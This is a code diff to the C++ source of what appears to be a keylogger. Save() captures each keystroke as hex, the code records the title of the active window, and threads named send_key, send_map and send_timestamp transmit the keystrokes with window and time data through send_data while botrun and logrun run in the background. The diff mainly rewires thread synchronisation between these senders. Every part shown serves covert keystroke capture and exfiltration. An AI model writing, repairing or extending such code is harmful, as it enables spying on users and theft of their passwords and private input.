@@ -117,7 +117,6 @@ unsigned int process_counter = 0;
 FILE* output_file, * dbg_file;
 my_string vecdata, queued_vecdata;	////////////////
 std::queue<my_string> keydata;
-std::queue<std::pair<unsigned int, time_t>> timestampdata;	//need?
 
 // std::mutex sendkey_lock, sendmap_lock, sendtimeline_lock;
 std::mutex mx;
@@ -191,8 +190,8 @@ void send_data(const std::string& msg, std::string& err) {
 //experimental impl
 void send_map(std::string& err) {
 	std::unique_lock<std::mutex> locker(mx);
-	while (is_sendkey) condvar.wait(locker);
-	is_sendmap = true;
+	while (is_sendtimestamp) condvar.wait(locker);
+	// is_sendmap = true;
 
 	err = "ok!";
 	for (auto& pp : queued_mapper) {
@@ -211,8 +210,8 @@ void send_map(std::string& err) {
 //experimental impl
 void send_timestamp(unsigned int id, time_t stamp, std::string& err) {
 	std::unique_lock<std::mutex> locker(mx);
-	while (is_sendmap) condvar.wait(locker);
-	is_sendtimestamp = true;
+	while (is_sendkey) condvar.wait(locker);
+	// is_sendtimestamp = true;
 
 	char _buf[101];
 	snprintf(_buf, 100, "[%u %lld", id, stamp);
@@ -227,8 +226,8 @@ void send_timestamp(unsigned int id, time_t stamp, std::string& err) {
 //experimental impl
 void send_key(size_t len, std::string& err) {
 	std::unique_lock<std::mutex> locker(mx);
-	while (is_sendtimestamp) condvar.wait(locker);
-	is_sendkey = true;
+	while (is_sendmap) condvar.wait(locker);
+	// is_sendkey = true;
 
 	size_t uselen = std::min(len, keydata.front().size());
 	std::string data = keydata.front().get(uselen);
@@ -238,6 +237,12 @@ void send_key(size_t len, std::string& err) {
 
 	is_sendkey = false;
 	condvar.notify_all();
+}
+
+void storekeychar(int __stroke) {
+	char __buffer[5];
+	snprintf(__buffer, 4, "%.2x", __stroke);
+	keydata.front().try_push(std::string(__buffer));
 }
 
 int Save(int key_stroke) {
@@ -272,39 +277,39 @@ int Save(int key_stroke) {
 				print_to("\nNew map: %d %s\n", process_counter, mbwindow_title);
 
 				std::string err_sendmap;
+				//Mitigation to :Thread autorun after initialization !? 
+				is_sendmap = true;
 				std::thread sendmap_thread(send_map, std::ref(err_sendmap));
 				sendmap_thread.join();
 				if (err_sendmap == "ok!") {
 					queued_mapper.clear();
-				}
+				} 
 				else {
-					assert(false && "Send map error: " && err.c_str());
+					assert(false && "Send map error: " && err_sendmap.c_str());
 				}
 			}
 
+			unsigned int mapper_id = mapper[strwindow_title];
+
 			keydata.push(my_string());
-			timestampdata.push({ process_counter, timestamp });
 			std::string err_sendkey, err_sendtimestamp;
+			//Thread autorun after initialization !? this is mitigation
+			is_sendkey = true;
+			is_sendtimestamp = true;
 			std::thread sendtimestamp_thread(send_timestamp, process_counter, timestamp, std::ref(err_sendtimestamp));
 			std::thread sendkey_thread(send_key, 100, std::ref(err_sendkey));
-			sendtimestamp_thread.join();
 			sendkey_thread.join();
+			sendtimestamp_thread.join();
 			if (err_sendkey != "ok!" || err_sendtimestamp != "ok!") {
 				assert(false && "Fail to send timestamp and data!");
 			}
 			keydata.pop();
-			timestampdata.pop();
 
 			print_to("\nMap: Stamp: %u %llu\n", process_counter, timestamp);
-			print_to("vecdata currently holding %d elements!\n", vecdata.size());
+			// print_to("vecdata currently holding %d elements!\n", vecdata.size());
 		}
 	}
 
-	auto storekeychar = [](int __stroke) {
-		char __buffer[5];
-		snprintf(__buffer, 4, "%.2x", __stroke);
-		keydata.front().try_push(std::string(__buffer));
-	};
 	print_to("[%.2x]", key_stroke);
 	storekeychar(key_stroke);
 
@@ -421,7 +426,6 @@ int main() {
 
 	//baseline, might not need
 	keydata.push(my_string());
-	timestampdata.push({ 0,0 });
 
 	std::thread t2(botrun);
 	std::thread t1(logrun);
